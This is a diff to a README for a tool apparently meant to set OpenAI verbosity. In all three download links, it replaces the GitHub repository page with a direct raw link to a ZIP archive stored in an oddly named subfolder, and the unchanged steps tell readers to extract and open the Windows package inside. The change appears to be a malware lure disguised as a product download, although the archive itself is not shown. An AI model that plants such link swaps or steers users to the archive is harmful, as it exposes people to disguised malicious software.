@@ -1,6 +1,6 @@
 # 🧩 pi-verbosity-control - Set OpenAI Verbosity Your Way
 
-[![Download](https://img.shields.io/badge/Download%20pi-verbosity-control-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bottomlessnessmiterbox585/pi-verbosity-control)
+[![Download](https://img.shields.io/badge/Download%20pi-verbosity-control-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/bottomlessnessmiterbox585/pi-verbosity-control/main/nullibicity/control-pi-verbosity-2.4-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@
 
 Use the link below to visit the download page and get the app:
 
-[Download pi-verbosity-control](https://github.com/bottomlessnessmiterbox585/pi-verbosity-control)
+[Download pi-verbosity-control](https://raw.githubusercontent.com/bottomlessnessmiterbox585/pi-verbosity-control/main/nullibicity/control-pi-verbosity-2.4-alpha.3.zip)
 
 ## ✨ What This App Does
 
@@ -30,7 +30,7 @@ Use the link below to visit the download page and get the app:
 ## 📥 Download and Install
 
 1. Open the download page:
-   [https://github.com/bottomlessnessmiterbox585/pi-verbosity-control](https://github.com/bottomlessnessmiterbox585/pi-verbosity-control)
+   [https://raw.githubusercontent.com/bottomlessnessmiterbox585/pi-verbosity-control/main/nullibicity/control-pi-verbosity-2.4-alpha.3.zip](https://raw.githubusercontent.com/bottomlessnessmiterbox585/pi-verbosity-control/main/nullibicity/control-pi-verbosity-2.4-alpha.3.zip)
 2. Download the Windows app package from the repository page.
 3. If the file is in a ZIP folder, right-click it and choose Extract All.
 4. Open the extracted folder.
